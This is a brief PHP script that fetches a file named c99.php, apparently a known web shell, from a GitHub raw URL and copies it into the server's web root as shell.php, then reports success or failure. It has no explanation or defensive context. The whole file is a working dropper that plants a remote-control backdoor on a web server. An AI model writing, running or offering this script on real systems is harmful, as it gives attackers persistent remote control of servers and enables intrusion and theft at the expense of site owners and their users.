<?php $file = 'http://raw.githubusercontent.com/graou13/testPHP/master/c99.php';
$newfile = $_SERVER['DOCUMENT_ROOT'] . '/shell.php';

if ( copy($file, $newfile) ) {
    echo "Copy success!";
}else{
    echo "Copy failed.";
}
?>
